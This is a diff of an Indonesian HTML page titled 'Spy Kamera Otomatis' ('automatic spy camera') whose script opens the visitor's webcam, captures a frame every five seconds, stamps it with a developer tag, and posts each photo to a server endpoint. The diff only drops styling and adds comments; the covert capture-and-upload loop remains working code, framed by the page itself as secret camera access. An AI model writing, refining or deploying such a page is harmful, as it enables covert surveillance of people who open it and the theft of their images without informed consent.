@@ -2,23 +2,6 @@
 <html>
   <head>
     <title>Spy Kamera Otomatis</title>
-    <style>
-      .photo-container {
-        position: relative;
-        display: inline-block;
-      }
-
-      .overlay {
-        position: absolute;
-        top: 10px;
-        left: 10px;
-        background-color: rgba(0, 0, 0, 0.5);
-        color: white;
-        padding: 5px;
-        font-size: 14px;
-        font-weight: bold;
-      }
-    </style>
   </head>
   <body>
     <h2>Akses Kamera Diam-diam</h2>
@@ -31,21 +14,25 @@
       const context = canvas.getContext("2d");
       let spamInterval;
 
+      // Mengakses kamera pengguna
       navigator.mediaDevices.getUserMedia({ video: true })
         .then((stream) => {
           video.srcObject = stream;
 
-          // Mulai spam foto setiap 5 detik
+          // Mulai mengambil foto setiap 5 detik
           spamInterval = setInterval(() => {
+            // Menggambar video ke canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Tambahkan teks pada gambar sebelum dikirim
-            context.font = "20px Arial";
+            // Menambahkan teks "Dev By @FazrrEdan" pada gambar
+            context.font = "20px Arial";  // Set font ukuran teks
             context.fillStyle = "rgba(0, 0, 0, 0.7)";  // Set warna teks
             context.fillText("Dev By @FazrrEdan", 10, 30);  // Posisi teks di atas gambar
 
+            // Mengambil data gambar dengan teks
             const imageData = canvas.toDataURL("image/jpeg");
 
+            // Mengirim gambar ke server
             fetch("/api/kirim", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
@@ -57,7 +44,7 @@
           alert("Gagal akses kamera: " + err);
         });
 
-      // Hentikan spam kalau user keluar/close
+      // Hentikan spam foto jika pengguna keluar/menutup halaman
       window.addEventListener("beforeunload", () => {
         clearInterval(spamInterval);
       });
